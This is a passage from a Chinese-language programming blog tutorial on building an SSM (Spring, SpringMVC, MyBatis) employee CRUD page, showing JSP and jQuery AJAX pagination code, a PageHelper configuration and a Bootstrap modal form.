class="name">a</span>&gt;</span>").append(item));</span></span><br><span class="line"><span class="xml">                ul.append(numLi);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            //添加后一页和末页的提示</span></span><br><span class="line"><span class="xml">            ul.append(nextPageLi).append(lastPageLi);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            //把ul加入到nav元素中</span></span><br><span class="line"><span class="xml">            var navEle = $("<span class="tag">&lt;<span class="name">nav</span>&gt;</span><span class="tag">&lt;/<span class="name">nav</span>&gt;</span>").append(ul);</span></span><br><span class="line"><span class="xml">            navEle.appendTo("#page_nav_area");</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>这样就可以正常显示了，但是点击超链接并没有动作执行，接下来就需要编写动作了</p>
<h4 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h4><p>基本思路就是每点击一个超链接，就发送一次ajax请求,并且与之前的样式一样<br><figure class="highlight erb"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-</span></span><br><span class="line"><span class="ruby">    web路径：</span></span><br><span class="line"><span class="ruby">        不以/开始的相对路径，找资源，以当前资源的路径为基准，经常容易出现问题</span></span><br><span class="line"><span class="ruby">        以/开始的相对路径，找资源，以服务器的路径为标准（<span class="symbol">http:</span>/<span class="regexp">/localhost:3306）需要加上项目名</span></span></span><br><span class="line"><span class="ruby">            <span class="symbol">http:</span>/<span class="regexp">/localhost:3306/crud</span></span></span><br><span class="line"><span class="ruby">-</span><span class="xml">-%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ taglib uri=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> prefix=<span class="string">"c"</span></span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>员工列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="ruby">        pageContext.setAttribute(<span class="string">"APP_PATH"</span>,request.getContextPath());</span></span><br><span class="line"><span class="ruby">    </span><span class="xml">%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/js/jquery-3.5.1.min.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-标题-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>SSM-CRUD<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-按钮-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4 col-md-offset-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>新增<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger"</span>&gt;</span>删除<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-显示表格数据-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-hover"</span> <span class="attr">id</span>=<span class="string">"emps_table"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>email<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>操作<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                    员工数据等-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-显示分页信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            分页文字信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_info_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            显示页码等信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            分页条信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_nav_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            显示分页条信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    //1.页面加载完成以后，直接去发送一个ajax请求，要到分页数据</span></span><br><span class="line"><span class="xml">    $(function ()&#123;</span></span><br><span class="line"><span class="xml">        //去首页</span></span><br><span class="line"><span class="xml">        to_page(1);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"><span class="xml">    </span></span><br><span class="line"><span class="xml">    function to_page(pn) &#123;</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/emps",</span></span><br><span class="line"><span class="xml">            data:"pn="+pn,</span></span><br><span class="line"><span class="xml">            type:"GET",</span></span><br><span class="line"><span class="xml">            success:function (result)&#123;</span></span><br><span class="line"><span class="xml">                // console.log(result);</span></span><br><span class="line"><span class="xml">                //1.解析并显示员工数据</span></span><br><span class="line"><span class="xml">                build_emps_tables(result);</span></span><br><span class="line"><span class="xml">                //2.解析并显示分页信息</span></span><br><span class="line"><span class="xml">                build_page_info(result);</span></span><br><span class="line"><span class="xml">                //3.解析并显示分页条数据</span></span><br><span class="line"><span class="xml">                build_page_nav(result);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    function build_emps_tables(result) &#123;</span></span><br><span class="line"><span class="xml">        //清空table</span></span><br><span class="line"><span class="xml">        $("#emps_table tbody").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        var emps=result.extend.pageInfo.list;</span></span><br><span class="line"><span class="xml">        $.each(emps,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">            var empIdTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empId);</span></span><br><span class="line"><span class="xml">            var empNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empName);</span></span><br><span class="line"><span class="xml">            var genderTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.gender=='M'?"男":"女");</span></span><br><span class="line"><span class="xml">            var emailTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.email);</span></span><br><span class="line"><span class="xml">            var deptNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.department.deptName);</span></span><br><span class="line"><span class="xml">            /**</span></span><br><span class="line"><span class="xml">             * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-pencil"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">             编辑</span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">             */</span></span><br><span class="line"><span class="xml">            var editBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-primary btn-sm")</span></span><br><span class="line"><span class="xml">                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-pencil")).append("编辑");</span></span><br><span class="line"><span class="xml">            /**</span></span><br><span class="line"><span class="xml">             * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-trash"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> /&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">             删除</span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">             */</span></span><br><span class="line"><span class="xml">            var delBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-danger btn-sm")</span></span><br><span class="line"><span class="xml">                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-trash")).append("删除");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            var btnTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(editBtn).append(" ").append(delBtn);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            //append方法执行完成之后还是返回原来的元素</span></span><br><span class="line"><span class="xml">            $("<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span>").append(empIdTd)</span></span><br><span class="line"><span class="xml">                .append(empNameTd)</span></span><br><span class="line"><span class="xml">                .append(genderTd)</span></span><br><span class="line"><span class="xml">                .append(emailTd)</span></span><br><span class="line"><span class="xml">                .append(deptNameTd)</span></span><br><span class="line"><span class="xml">                .append(btnTd)</span></span><br><span class="line"><span class="xml">                .appendTo("#emps_table tbody")</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">    //解析显示分页信息</span></span><br><span class="line"><span class="xml">    function build_page_info(result)&#123;</span></span><br><span class="line"><span class="xml">        //清空分页信息</span></span><br><span class="line"><span class="xml">        $("#page_info_area").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        $("#page_info_area").append("当前"+result.extend.pageInfo.pageNum+"页,总"</span></span><br><span class="line"><span class="xml">            +result.extend.pageInfo.pages+"页,总"</span></span><br><span class="line"><span class="xml">            +result.extend.pageInfo.total+"条记录");</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">    //解析显示分页条,点击分页要能去下一页等等....</span></span><br><span class="line"><span class="xml">    function build_page_nav(result) &#123;</span></span><br><span class="line"><span class="xml">        //清空</span></span><br><span class="line"><span class="xml">        $("#page_nav_area").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //page_nav_area</span></span><br><span class="line"><span class="xml">        var ul = $("<span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span>").addClass("pagination");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //构建元素</span></span><br><span class="line"><span class="xml">        var firstPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("首页").attr("href","#"));</span></span><br><span class="line"><span class="xml">        var prePageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;laquo;"));</span></span><br><span class="line"><span class="xml">        if(result.extend.pageInfo.hasPreviousPage == false)&#123;</span></span><br><span class="line"><span class="xml">            firstPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">            prePageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            //为元素添加点击翻页的事件</span></span><br><span class="line"><span class="xml">            firstPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            prePageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pageNum-1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //构建元素</span></span><br><span class="line"><span class="xml">        var nextPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;raquo;"));</span></span><br><span class="line"><span class="xml">        var lastPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("末页").attr("href","#"));</span></span><br><span class="line"><span class="xml">        if(result.extend.pageInfo.hasNextPage == false)&#123;</span></span><br><span class="line"><span class="xml">            nextPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">            lastPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            //为元素添加点击翻页的事件</span></span><br><span class="line"><span class="xml">            nextPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pageNum+1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            lastPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pages);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //添加首页和前一页的提示</span></span><br><span class="line"><span class="xml">        ul.append(firstPageLi).append(prePageLi);</span></span><br><span class="line"><span class="xml">        //1,2,3....遍历给ul中添加页码提示</span></span><br><span class="line"><span class="xml">        $.each(result.extend.pageInfo.navigatepageNums,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">            var numLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append(item));</span></span><br><span class="line"><span class="xml">            if(result.extend.pageInfo.pageNum == item)&#123;</span></span><br><span class="line"><span class="xml">                numLi.addClass("active");</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">            numLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(item);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            ul.append(numLi);</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">        //添加后一页和末页的提示</span></span><br><span class="line"><span class="xml">        ul.append(nextPageLi).append(lastPageLi);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //把ul加入到nav元素中</span></span><br><span class="line"><span class="xml">        var navEle = $("<span class="tag">&lt;<span class="name">nav</span>&gt;</span><span class="tag">&lt;/<span class="name">nav</span>&gt;</span>").append(ul);</span></span><br><span class="line"><span class="xml">        navEle.appendTo("#page_nav_area");</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>可以看到代码中有清空的操作，这是为了防止点击下一页的时候导致样式重叠</p>
<p>但是这样写当点击前一页或后一页时，到首页或末页，页码依旧会向后移动，这是不希望看到的，所以就需要利用pageHelper中的reasonable，来合理化<br>mybatis配置文件中修改<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- com.github.pagehelper为PageHelper类所在包名 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span> <span class="attr">interceptor</span>=<span class="string">"com.github.pagehelper.PageInterceptor"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            分页合理化--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"reasonable"</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这样插件就自动帮我们完成了合理化操作</p>
<h1 id="新增功能"><a href="#新增功能" class="headerlink" title="新增功能"></a>新增功能</h1><ol>
<li><p>在index.jsp页面点击新增</p>
</li>
<li><p>弹出新增对话框</p>
</li>
<li><p>去数据库查询部门列表，显示在对话框中</p>
</li>
<li><p>用户输入数据完成保存</p>
</li>
</ol>
<p>打开bootstarp的 <a href="https://v3.bootcss.com/javascript/#modals" target="_blank" rel="noopener">JavaScript插件</a> 选择模态框</p>
<p>这里踩了个坑，竟然是bootstrap的引用顺序问题</p>
<p>修改为<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;link <span class="attribute">href</span>=<span class="string">"<span class="variable">$&#123;APP_PATH&#125;</span>/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"</span> <span class="attribute">rel</span>=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;script <span class="attribute">src</span>=<span class="string">"<span class="variable">$&#123;APP_PATH&#125;</span>/static/js/jquery-3.5.1.min.js"</span> <span class="attribute">type</span>=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script <span class="attribute">src</span>=<span class="string">"<span class="variable">$&#123;APP_PATH&#125;</span>/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><br>不然会导致模态框无法使用</p>
<p>接着参考 <a href="https://v3.bootcss.com/css/#forms-horizontal" target="_blank" rel="noopener">bootstrap表单</a> 的水平表单</p>
<p>复制到modal-body中<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">&lt;form <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-horizontal"</span>&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-group"</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">"inputEmail3"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-2 control-label"</span>&gt;<span class="type">Email</span>&lt;/label&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-10"</span>&gt;</span><br><span class="line">      &lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"email"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-control"</span> id=<span class="string">"inputEmail3"</span> placeholder=<span class="string">"Email"</span>&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-group"</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">"inputPassword3"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-2 control-label"</span>&gt;<span class="type">Password</span>&lt;/label&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-10"</span>&gt;</span><br><span class="line">      &lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"password"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-control"</span> id=<span class="string">"inputPassword3"</span> placeholder=<span class="string">"Password"</span>&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-group"</span>&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-offset-2 col-sm-10"</span>&gt;</span><br><span class="line">      &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"checkbox"</span>&gt;</span><br><span class="line">        &lt;label&gt;</span><br><span class="line">          &lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"checkbox"</span>&gt; <span class="type">Remember</span> me</span><br><span class="line">        &lt;/label&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-group"</span>&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-offset-2 col-sm-10"</span>&gt;</span><br><span class="line">      &lt;button <span class="class"><span class="keyword">type</span></span>=<span class="string">"submit"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"btn btn-default"</span>&gt;<span class="type">Sign</span> in&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p>
<p>基本的模态框（未加数据库查找）<br><figure class="highlight erb"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-</span></span><br><span class="line"><span class="ruby">    web路径：</span></span><br><span class="line"><span class="ruby">        不以/开始的相对路径，找资源，以当前资源的路径为基准，经常容易出现问题</span></span><br><span class="line"><span class="ruby">        以/开始的相对路径，找资源，以服务器的路径为标准（<span class="symbol">http:</span>/<span class="regexp">/localhost:3306）需要加上项目名</span></span></span><br><span class="line"><span class="ruby">            <span class="symbol">http:</span>/<span class="regexp">/localhost:3306/crud</span></span></span><br><span class="line"><span class="ruby">-</span><span class="xml">-%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ taglib uri=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> prefix=<span class="string">"c"</span></span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span 